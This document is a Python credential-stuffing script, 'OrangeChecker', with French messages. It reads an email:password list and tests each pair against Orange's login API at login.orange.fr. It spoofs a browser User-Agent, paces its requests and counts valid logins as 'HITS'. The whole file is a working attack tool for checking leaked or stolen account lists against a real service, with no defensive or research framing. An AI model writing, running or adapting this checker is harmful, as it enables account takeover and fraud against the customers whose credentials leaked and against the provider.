#!/usr/bin/env python3
import requests
import sys
import time

class OrangeChecker:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

    def __init__(self, file_path, delay=0.5):
        self.file_path = file_path
        self.delay = delay
        self.hits = 0
        self.invalid = 0
        self.errors = 0
        self.total = 0
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Content-Type': 'application/json'
        })

    def update_title(self):
        restants = self.total - self.hits - self.invalid - self.errors
        title = f"[HITS] : {self.hits} | [INVALID] : {self.invalid} | [ERRORS] : {self.errors} | [RESTANTS] : {restants}"
        sys.stdout.write(f'\033]0;{title}\007')
        sys.stdout.flush()

    def test_account(self, email, password):
        try:
            # Step 1: Send login
            resp1 = self.session.post(
                "https://login.orange.fr/api/login",
                json={"login": email, "loginOrigin": "input"},
                timeout=10,
                allow_redirects=False
            )

            if resp1.status_code not in [200, 201, 302]:
                return "invalid"

            # Step 2: Send password
            resp2 = self.session.post(
                "https://login.orange.fr/api/password",
                json={"password": password},
                timeout=10,
                allow_redirects=False
            )

            if resp2.status_code in [200, 201]:
                return "hit"
            elif resp2.status_code in [401, 403, 400]:
                return "invalid"
            elif resp2.status_code == 302:
                return "hit"
            else:
                return "error"

        except requests.exceptions.Timeout:
            return "error"
        except requests.exceptions.ConnectionError:
            return "error"
        except Exception:
            return "error"

    def run(self):
        try:
            with open(self.file_path, 'r') as f:
                accounts = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{self.RED}Fichier non trouvé: {self.file_path}{self.RESET}")
            return

        self.total = len(accounts)
        print(f"{self.GREEN}Orange Checker - {self.total} comptes{self.RESET}\n")

        for idx, account in enumerate(accounts, 1):
            if ':' not in account:
                self.errors += 1
                continue

            email, password = account.split(':', 1)
            email = email.strip()
            password = password.strip()

            result = self.test_account(email, password)

            if result == "hit":
                print(f"{self.GREEN}[{idx:6d}] {email[:40].ljust(40)} | ✓ HIT{self.RESET}")
                self.hits += 1
            elif result == "invalid":
                print(f"{self.RED}[{idx:6d}] {email[:40].ljust(40)} | ✗ INVALID{self.RESET}")
                self.invalid += 1
            else:
                print(f"{self.YELLOW}[{idx:6d}] {email[:40].ljust(40)} | ⚠ ERROR{self.RESET}")
                self.errors += 1

            self.update_title()
            time.sleep(self.delay)

        print(f"\n{self.GREEN}✓ HITS: {self.hits}{self.RESET}")
        print(f"{self.RED}✗ INVALID: {self.invalid}{self.RESET}")
        print(f"{self.YELLOW}⚠ ERRORS: {self.errors}{self.RESET}")
        self.update_title()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('file', help='Fichier accounts.txt (email:password)')
    parser.add_argument('--delay', type=float, default=0.5, help='Délai entre tests')
    args = parser.parse_args()

    checker = OrangeChecker(args.file, args.delay)
    checker.run()
